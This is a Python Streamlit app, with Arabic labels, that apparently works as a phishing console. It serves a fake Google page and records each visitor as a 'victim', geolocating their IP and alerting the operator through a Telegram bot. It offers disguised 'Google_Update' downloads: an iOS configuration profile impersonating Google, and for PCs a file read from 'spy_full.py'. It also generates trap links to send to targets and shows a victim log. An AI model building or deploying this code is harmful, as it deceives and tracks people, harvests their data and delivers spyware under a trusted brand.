import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - Developer Console", page_icon="🛡️", layout="wide")

# إخفاء واجهة Streamlit تماماً في وضع التمويه
hide_st_style = """
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            header {visibility: hidden;}
            .stApp [data-testid="stToolbar"] {display: none;}
            .stApp [data-testid="stDecoration"] {display: none;}
            .stApp [data-testid="stStatusWidget"] {display: none;}
            #manage-app-button {display: none !important;}
            [data-testid="stStatusWidget"] {display: none !important;}
            .st-emotion-cache-10trblm {display: none !important;}
            .st-emotion-cache-1dp5vir {display: none !important;}
            </style>
            """

# دالة جلب الـ IP العام من السيرفر (كاحتياط)
def get_server_side_ip():
    try:
        # محاولة جلب الـ IP من ترويسات Streamlit
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            return headers["X-Forwarded-For"].split(",")[0].strip()
        return "Unknown"
    except:
        return "Unknown"

# دالة إرسال التنبيه لتلجرام
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        return
        
    # جلب البيانات الجغرافية
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except:
        pass

    message = f"""
🎯 تنبيه: تم اكتشاف ضحية جديدة!

📍 عنوان IP: {ip}
🌍 الدولة: {geo_data['country']}
🏙️ المدينة: {geo_data['city']}
🏢 مزود الخدمة: {geo_data['isp']}
📱 الجهاز: {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
        # تسجيل الضحية في الملف المحلي
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except:
        pass

# التحقق من وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)
    
    # جلب الـ IP من الرابط إذا تم إرساله بواسطة JS، أو من السيرفر
    client_ip = query_params.get("ip", get_server_side_ip())
    trap_name = query_params.get("trap", "Google Decoy")
    
    # إرسال التنبيه فوراً إذا لم يتم إرساله مسبقاً في هذه الجلسة
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name)
        st.session_state.alert_sent = True

    # عرض صفحة Google الوهمية
    with open("index.html", "r", encoding="utf-8") as f:
        html_content = f.read()
    st.components.v1.html(html_content, height=1000, scrolling=False)
    st.stop()

# معالجة طلبات التحميل المباشرة
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = query_params.get("ip", get_server_side_ip())
    send_telegram_alert(ip, f"Download ({device})", device)
    
    if device == "android":
        file_name = "Google_Update.apk"
        content = b"Fake APK Content"
    elif device == "ios":
        file_name = "Google_Update.mobileconfig"
        # إنشاء ملف تعريف آيفون حقيقي تقنياً
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
    else:
        file_name = "Google_Update.py"
        with open("spy_full.py", "r") as f:
            content = f.read().encode('utf-8')
            
    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream")
    st.stop()

# --- الواجهة الرئيسية للمطور ---
st.title("🛡️ لوحة تحكم Rashd_Ai")

# نظام تسجيل الدخول البسيط
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    with st.form("login_form"):
        user = st.text_input("اسم المستخدم")
        pw = st.text_input("كلمة المرور", type="password")
        if st.form_submit_button("دخول"):
            if user == "Rashd919" and pw == "112233":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("بيانات خاطئة")
    st.stop()

# الشريط الجانبي
with st.sidebar:
    st.header("⚙️ الإعدادات")
    telegram_bot_token = st.text_input("Telegram Bot Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
    telegram_chat_id = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
    if st.button("حفظ إعدادات تلجرام"):
        config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
        config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
        st.success("تم الحفظ بنجاح!")

# التبويبات الـ 18 المطلوبة
tabs = st.tabs([
    "💬 المحادثة", "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", 
    "🏗️ سطح الهجوم", "🧠 تحليل ذكي", "🤖 مساعد الهجوم", "🔎 جوجل دورك", 
    "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ", 
    "⚠️ الثغرات", "🗺️ الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير",
    "🎯 المصيدة"
])

# محتوى التبويبات (تبسيط للعرض)
for i, tab in enumerate(tabs[:-1]):
    with tab:
        st.info(f"أداة {tab.label} جاهزة للعمل.")
        st.button(f"بدء {tab.label}", key=f"btn_{i}")

# تبويب المصيدة (Trap)
with tabs[-1]:
    st.header("🎯 نظام المصيدة المتقدم")
    col1, col2 = st.columns(2)
    with col1:
        st.subheader("🔗 توليد الروابط")
        trap_name = st.text_input("اسم المصيدة", value="Google_Update")
        base_url = "https://rashdai.streamlit.app/"
        decoy_url = f"{base_url}?decoy=google&trap={trap_name}"
        st.code(decoy_url, language="text")
        st.info("انسخ الرابط أعلاه وأرسله للضحية.")
        
    with col2:
        st.subheader("📊 سجل الضحايا")
        victims = victim_logger.get_all_victims()
        if victims:
            st.table(victims)
        else:
            st.write("لا يوجد ضحايا مسجلين بعد.")

    st.subheader("📈 الإحصائيات")
    st.write(f"إجمالي الضحايا: {len(victims)}")
